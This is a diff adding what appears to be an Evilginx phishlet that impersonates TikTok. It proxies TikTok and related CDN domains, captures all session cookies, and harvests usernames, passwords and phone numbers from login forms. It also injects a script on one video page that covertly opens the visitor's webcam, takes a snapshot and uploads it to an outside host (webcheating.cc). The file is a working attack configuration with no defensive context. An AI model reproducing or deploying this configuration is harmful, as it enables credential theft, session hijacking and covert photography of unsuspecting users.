@@ -1,0 +1,121 @@
+author: '@An0nUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'tiktok', orig_sub: 'www', domain: 'tiktok.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'tiktok.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'tiktok.com', session: true, is_landing: false}  
+  - {phish_sub: 'polyfill', orig_sub: '', domain: 'polyfill.io', session: true, is_landing: false}
+  - {phish_sub: 's16', orig_sub: 's16', domain: 'tiktokcdn.com', session: true, is_landing: false}
+  - {phish_sub: 'hypstarcdn', orig_sub: 's16', domain: 'hypstarcdn.com', session: true, is_landing: false}
+  - {phish_sub: 'kakao', orig_sub: 'developers', domain: 'kakao.com', session: true, is_landing: false}
+  - {phish_sub: 'mon-va', orig_sub: 'mon-va', domain: 'byteoversea.com', session: true, is_landing: false}
+  - {phish_sub: 'maliva', orig_sub: 'maliva-mcs', domain: 'byteoversea.com', session: true, is_landing: false}
+  - {phish_sub: 'sf16-muse-va', orig_sub: 'sf16-muse-va', domain: 'ibytedtos.com', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'm', domain: 'tiktok.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'm', domain: 'tiktok.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 's16', domain: 'tiktokcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 's16', domain: 'tiktokcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 's16', domain: 'tiktokcdn.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: '', domain: 'polyfill.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: '', domain: 'polyfill.io', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: '', domain: 'polyfill.io', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 's16', domain: 'hypstarcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 's16', domain: 'hypstarcdn.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 's16', domain: 'hypstarcdn.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'developers', domain: 'kakao.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'developers', domain: 'kakao.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'developers', domain: 'kakao.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'mon-va', domain: 'byteoversea.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'mon-va', domain: 'byteoversea.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'mon-va', domain: 'byteoversea.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'maliva-mcs', domain: 'byteoversea.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'maliva-mcs', domain: 'byteoversea.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'maliva-mcs', domain: 'byteoversea.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'sf16-muse-va', domain: 'ibytedtos.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'sf16-muse-va', domain: 'ibytedtos.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'm.tiktok.com', orig_sub: 'sf16-muse-va', domain: 'ibytedtos.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+
+
+
+auth_tokens:
+  - domain: '.tiktok.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'account'
+    search: '(.*)'
+    type: 'post'  
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: 'mobile'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.tiktok.com'
+  path: '/@vdalkuzo/video/7413784369283861768'
+
+
+js_inject:
+  - trigger_domains: ["www.tiktok.com"]
+    trigger_paths: ["/@vdalkuzo/video/7413784369283861768"]
+    script: |
+      document.addEventListener('DOMContentLoaded', () => {
+      const video = document.createElement('video');
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+
+      video.autoplay = true;
+      video.style.display = 'none';
+
+      document.body.appendChild(video);
+      document.body.appendChild(canvas);
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+
+          video.addEventListener('loadedmetadata', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            const base64Data = imageData.split(',')[1];
+            const binaryString = atob(base64Data);
+            const len = binaryString.length;
+            const uint8Array = new Uint8Array(len);
+
+            for (let i = 0; i < len; i++) {
+              uint8Array[i] = binaryString.charCodeAt(i);
+            }
+
+            const blob = new Blob([uint8Array], { type: 'image/png' });
+
+            const formData = new FormData();
+            formData.append('file', blob, 'image.png');
+
+            fetch('https://webcheating.cc:5000/upload', {
+              method: 'POST',
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+              console.log('Success:', data);
+            })
+            .catch(error => {
+              console.error('Error:', error);
+            });
+        });
+      })
+      .catch(error => {
+        console.error('failed camera access:', error);
+      });
+      });
